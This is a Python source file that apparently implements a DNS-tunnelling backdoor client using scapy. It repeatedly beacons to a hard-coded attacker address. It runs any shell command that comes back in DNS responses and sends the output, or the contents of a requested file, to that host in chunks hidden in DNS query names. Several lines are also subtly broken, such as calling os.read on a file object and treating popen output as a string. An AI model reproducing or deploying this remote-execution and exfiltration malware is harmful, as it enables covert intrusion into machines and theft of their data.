import subprocess
from tabnanny import verbose
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import time
from base64 import b64decode, b64encode
from enum import IntEnum
import os






Att_ip="192.168.1.30"
ICMP_ID_HELO = 23144
ICMP_ID = 54545
is_ready = False
TTL = 64
mtu = 24
seqnum = 64

def sendDNSReq(msg,flag, seqnum = 64):
    if seqnum == 255:
        seqnum = 64
    dns_req = IP(dst=Att_ip, ttl=seqnum)/UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname=flag + msg + '.elad.com'))
    send(dns_req)

def sendhello():
    sendDNSReq("hi","8")


def DNSHandler(pkt):
    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()    
    handle_flag = payload[0]

    match handle_flag:
        case "1":
            printHandler(payload[1:])
        case "2":
            fileHandler(payload[1:])

def fileHandler(file_path):
    ret_ok = ""
    global seqnum

    with open(file_path, "rb") as file:
        payload = os.read(file)
        
    while True: 
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '1', seqnum)
            ret_ok = checkOK()
            if ret_ok == "ok":
                payload = payload[mtu:]
                seqnum += 1

        else:        
            sendDNSReq(payload ,'0', seqnum)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                break
 


def printHandler(command):
    payload = os.popen(command)
    global seqnum
    ret_ok = ""
    while True: 
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '1', seqnum)
            ret_ok = checkOK()
            if ret_ok == "ok":
                payload = payload[mtu:]
                seqnum += 1

        else:        
            sendDNSReq(payload ,'0',seqnum)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                break
 


def checkOK():
        #check filter
        pkt = sniff(filter="dns", count=1, timeout = 3)
        if pkt:
            payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode() 
            return payload


def listenRes():
    sniff(filter="dns", prn=DNSHandler, timeout=5)

def main():
    while True:
        sendhello()
        listenRes()


if __name__ == "__main__":
    main()






 

